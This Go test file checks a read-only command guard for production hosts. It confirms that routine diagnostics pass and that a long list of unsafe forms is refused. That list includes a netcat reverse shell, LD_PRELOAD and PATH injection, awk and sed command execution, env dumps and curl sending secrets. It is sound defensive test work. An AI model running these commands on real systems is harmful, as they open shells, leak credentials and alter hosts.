package guard

import "testing"

func TestReadonlyDailyDiagnostics(t *testing.T) {
	cfg, h := prodReadonlyHost("", nil)
	eff := resolve(t, cfg, h, false)
	for _, s := range []string{
		"sh -c 'ss -tlnp | grep nginx'", "bash -c 'ip -br addr; jps -l'", "grep env /tmp/config", "cat /tmp/env",
		"ip -o addr show", "ip -4 -br address", "ip -j route show", "jps", "jps -l", "java -version",
		"curl -q --noproxy '*' -sI --max-time 5 http://127.0.0.1/", "curl -q --noproxy '*' -I -m 5 https://[::1]:443/health",
		"diff -u /etc/nginx/a.conf /etc/nginx/b.conf", "sha256sum /tmp/app.jar", "md5sum /tmp/app.jar",
		"zcat /var/log/app.log.gz", "zgrep -in ERROR /var/log/app.log.gz", "sed -n '1,20p' /etc/nginx/nginx.conf", "awk '{print $1, $2}' /tmp/list",
		"docker inspect --format '{{json .NetworkSettings.Networks}}' app", "docker compose ps", "docker logs --tail 100 app", "journalctl -u nginx -n 100 --no-pager",
		"ping -c 2 -W 2 192.0.2.1", "nc -z -w 3 192.0.2.1 80", "lsof -nP -iTCP:80",
	} {
		if d := Decide(eff, s); !d.Allowed || d.NeedsConfirm {
			t.Errorf("query %s: %+v", s, d)
		}
	}
	for _, s := range []string{
		"env", "env -i", "env FOO=bar", "sudo env", "env --", "env -S ''", "printenv", "sh -c env",
		"env LD_PRELOAD=/tmp/injected.so ls", "PATH=/tmp ls", "LD_PRELOAD=/tmp/injected.so ls", "sh -c 'PATH=/tmp ls'",
		"PATH=/tmp; ls", "export PATH=/tmp; ls", "export", "declare -p", "for PATH in /tmp; do ls; done",
		"journalctl -f", "journalctl --follow", "journalctl --follow=false", "journalctl -nf", "docker logs -f app", "docker logs --follow=false app",
		"jps -m", "jps -v", "jps -J-javaagent:/tmp/evil", "java -javaagent:/tmp/evil -version",
		"curl -sI http://127.0.0.1/", "curl -q --noproxy '*' -I -m 5 http://example.com/", "curl -q --noproxy '*' -I -m 5 --data secret http://127.0.0.1/",
		"curl -q --noproxy '*' -I -m 5 -L http://127.0.0.1/", "curl -q --noproxy '*' -I -m 5 -K /tmp/curl.conf http://127.0.0.1/",
		"curl -q --noproxy '*' -I -m 5 http://127.0.0.1/?token=secret", "curl -q --noproxy '*' -I -m 5 -o /tmp/out http://127.0.0.1/",
		"curl -q --noproxy '*' -I -m 5 http://localhost/", "curl -q --noproxy '*' -I -m 5 http://127.0.0.1/[1-99999999]",
		"sed -i '1d' /tmp/file", "sed -n '1w /tmp/out' /tmp/file", "sed -n '1e touch /tmp/out' /tmp/file", "sed -f /tmp/script /tmp/file",
		"awk 'BEGIN {system(\"id\")}'", "awk '{print $1 > \"/tmp/out\"}' /tmp/file", "awk '{print $1}' ARGV=evil", "awk -f /tmp/script /tmp/file",
		"diff --diff-program=sh /tmp/a /tmp/b", "zcat --keep /tmp/a.gz", "zless +!sh /tmp/a.gz",
		"docker inspect app", "docker inspect --format '{{json .Config.Env}}' app", "docker compose up", "docker -H tcp://192.0.2.1:2375 ps",
		"docker stats --no-stream --no-stream=false", "tail -f /var/log/x", "tail --follow=name /var/log/x", "journalctl --rot",
		"ip -br addr flush dev eth0", "ip -batch /tmp/cmd", "ip -n other addr", "nc -e /bin/sh 192.0.2.1 80", "nc -l 80", "nc -z -w 3 192.0.2.1 1-65535", "ping 192.0.2.1",
		"sh -c 'ss -tlnp; rm /tmp/x'", "bash -c '$COMMAND'", "sh -c 'cat /tmp/x >/tmp/out'", "systemctl restart nginx",
	} {
		if d := Decide(eff, s); d.Allowed {
			t.Errorf("unsafe form allowed %s: %+v", s, d)
		}
	}
}
